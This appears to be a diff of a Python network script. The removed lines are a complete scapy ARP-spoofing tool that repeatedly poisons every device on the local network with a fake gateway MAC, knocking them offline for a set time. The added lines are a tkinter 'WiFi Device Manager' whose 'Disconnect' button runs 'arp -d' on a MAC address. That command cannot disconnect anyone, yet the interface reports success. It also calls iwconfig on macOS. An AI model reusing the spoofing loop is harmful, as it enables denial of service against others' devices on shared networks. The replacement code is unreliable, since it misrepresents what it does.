@@ -1,79 +1,93 @@
-import os
-import sys
-import time 
+import subprocess
+import re
+import tkinter as tk
 import platform
-from collections import namedtuple
 
-from scapy.all import ARP, send, arping, socket, logging
-
-import constants
-import messages
-import logger as Logger
-
-def get_my_ip():
-    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    s.connect((constants.EXTERNAL_URL_FOR_ACQUIRING_IP, 80))
-    ip = s.getsockname()
-    s.close()
-    return ip[0]
-
-
-def get_devices_identities(ips):
-    answers, _ = arping(ips, verbose = 0)
-
-    NetworkIdentity = namedtuple('NetworkIdentity', ['ip', 'mac'])
-    return [NetworkIdentity(ip=answer[1].psrc, mac=answer[1].hwsrc) for answer in answers]
-
-
-def destroy(victim_ip, victim_mac, gateway_ip):
-    packet = ARP(op=2, psrc=gateway_ip, hwsrc='12:34:56:78:9A:BC', pdst=victim_ip, hwdst=victim_mac)
-    send(packet, verbose=0)
-    
-    
-def restore(victim_ip, victim_mac, gateway_ip, gateway_mac):
-    packet = ARP(op=2, psrc=gateway_ip, hwsrc=gateway_mac, pdst=victim_ip, hwdst=victim_mac)
-    send(packet, verbose=0)
-    
-    
-def check_permission():
-    if platform.system() is not 'Windows':
-        if os.geteuid() != 0:
-            Logger.permission_denied
-            exit()
-    
-        
-def get_ip_range(my_ip):
-    return ".".join(my_ip.split(".")[:-1]) + ".*"
-
-
-def get_block_time():
+def get_connected_devices():
     try:
-        time_amount = int(input(messages.DESTROY_TIME_AMOUNT_MSG))
-        return time.time() + time_amount
-    except ValueError:
-        time_amount = None
-        return time_amount
-    finally:
-        Logger.blocking_for(time_amount)
+        # Run the command to list connected devices using subprocess
+        result = subprocess.run(['arp', '-a'], capture_output=True, text=True)
+        output = result.stdout
 
+        # Use regex to extract IP, MAC addresses, and device names
+        pattern = r'(?P<ip>\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})\s+(?P<mac>([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2}))\s+(?P<device>\S+)'
+        devices = re.findall(pattern, output)
+
+        # Return a list of tuples (IP, MAC, Device) of connected devices
+        return devices
+    except Exception as e:
+        print(f"Error: {e}")
+        return []
+
+def disconnect_device(mac_address, button):
+    try:
+        # Run the command to block a specific device using subprocess
+        subprocess.run(['arp', '-d', mac_address])
+        button.config(state=tk.DISABLED, text="Disconnected", bg="red")
+    except Exception as e:
+        print(f"Error disconnecting device: {e}")
+
+def get_wifi_name():
+    try:
+        if platform.system() == 'Windows':
+            # For Windows, use netsh wlan command to get WiFi SSID
+            result = subprocess.run(['netsh', 'wlan', 'show', 'interfaces'], capture_output=True, text=True)
+            output = result.stdout
+            pattern = r'SSID\s+:\s+(?P<ssid>.+)'
+            match = re.search(pattern, output)
+            if match:
+                return match.group('ssid').strip()
+            else:
+                return "Unknown"
+        elif platform.system() in ['Linux', 'Darwin']:
+            # For Linux and macOS, use iwconfig command to get WiFi SSID
+            result = subprocess.run(['iwconfig'], capture_output=True, text=True)
+            output = result.stdout
+            pattern = r'ESSID:"(?P<ssid>.*)"'
+            match = re.search(pattern, output)
+            if match:
+                return match.group('ssid').strip()
+            else:
+                return "Unknown"
+        else:
+            return "Unknown"
+    except Exception as e:
+        print(f"Error getting WiFi name: {e}")
+        return "Unknown"
+
+def create_device_widgets(root, devices):
+    wifi_name = get_wifi_name()
+    wifi_label = tk.Label(root, text=f"Connected to WiFi: {wifi_name}", font=("Arial", 12, "bold"), fg="blue")
+    wifi_label.pack(pady=10)
+
+    for device in devices:
+        frame = tk.Frame(root, bd=2, relief=tk.RIDGE, padx=10, pady=5)
+        frame.pack(pady=5, fill=tk.X)
+
+        label = tk.Label(frame, text=f"Device Name: {device[2]}", font=("Arial", 12, "bold"), fg="green")
+        label.pack(side=tk.LEFT)
+
+        ip_label = tk.Label(frame, text=f"IP: {device[0]}", font=("Arial", 10))
+        ip_label.pack(side=tk.LEFT, padx=10)
+
+        mac_label = tk.Label(frame, text=f"MAC: {device[1]}", font=("Arial", 10))
+        mac_label.pack(side=tk.LEFT)
+
+        disconnect_button = tk.Button(frame, text="Disconnect", bg="orange", fg="white", font=("Arial", 10, "bold"))
+        disconnect_button.config(command=lambda mac=device[1], button=disconnect_button: disconnect_device(mac, button))
+        disconnect_button.pack(side=tk.RIGHT)
 
 if __name__ == "__main__":
-    check_permission()
-    ip_base = get_ip_range(get_my_ip())
-    devices_identities = get_devices_identities(ip_base)
-    gateway_ip, gateway_mac = devices_identities[0]    
-    Logger.show_connected_ips(devices_identities)
-    block_time = get_block_time()
+    devices = get_connected_devices()
 
-    try:
-        while (not block_time) or (time.time() < block_time):
-            for victim in devices_identities:
-                destroy(victim.ip, victim.mac, gateway_ip)
-    except KeyboardInterrupt:
-        sys.exit(0)
-    finally:
-        Logger.restoring_connections()
-        for victim in devices_identities:
-            restore(victim.ip, victim.mac, gateway_ip, gateway_mac) 
-        Logger.connections_restored()
-    
+    if devices:
+        root = tk.Tk()
+        root.title("WiFi Device Manager")
+        root.geometry("800x600")
+        root.configure(bg="white")
+
+        create_device_widgets(root, devices)
+
+        root.mainloop()
+    else:
+        print("No devices connected.")
